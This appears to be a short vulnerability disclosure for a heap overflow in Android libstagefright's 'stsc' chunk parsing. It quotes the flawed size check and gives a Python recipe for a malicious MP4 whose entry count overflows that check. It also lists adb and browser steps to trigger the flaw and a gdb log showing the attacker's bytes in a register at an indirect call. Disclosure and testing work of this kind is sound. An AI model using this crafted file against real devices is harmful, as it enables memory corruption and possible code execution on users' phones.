Android libstagefright 'stsc' chunk overflow

To get latest libstagefright sources:
$ repo sync frameworks/av
 
Code from libstagefright/SampleTable.cpp: (setSampleToChunkParams( method)

<code>
...	
    mNumSampleToChunkOffsets = U32_AT(&header[4]);

[1]  if (data_size < 8 + mNumSampleToChunkOffsets * 12) {
        return ERROR_MALFORMED;
    }

[2]  mSampleToChunkEntries =
        new SampleToChunkEntry[mNumSampleToChunkOffsets];

    for (uint32_t i = 0; i < mNumSampleToChunkOffsets; ++i) {
        uint8_t buffer[12];
        if (mDataSource->readAt(
                    mSampleToChunkOffset + 8 + i * 12, buffer, sizeof(buffer))
                != (ssize_t)sizeof(buffer)) {
            return ERROR_IO;
        }

</code>

Check on line #1 can be bypassed if we set nNumSampleToChunkOffset to 0x15555555+1.
Small buffer is allocted on line #2 which later result in heap overflow.

File 1.mp4 has been created with the following 'stsc' chunk:
chunk='stsc'       
chunk+='\x00\x00\x00\x00'
chunk+=struct.pack('>L',0x15555555+1)
chunk+='b'*22000

How to test :
1) copy file to /mnt/sdcard
$ adb push 1.mp4 /mnt/sdcard/1.mp4
2) open in Safari: file:///mnt/sdcard/1.mp4
3) click play

To debug attach to /system/bin/mediaserver process.
For example on x86 emulator with Android 4.3.2 I've observed the following crash:
...
0xb7610426 in ?? ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xb6bb4fb9 in ?? ()
(gdb) x/1i $pc
=> 0xb6bb4fb9:	call   *0x1c(%ecx)
(gdb) i r ecx
ecx            0x62626262	1633771873
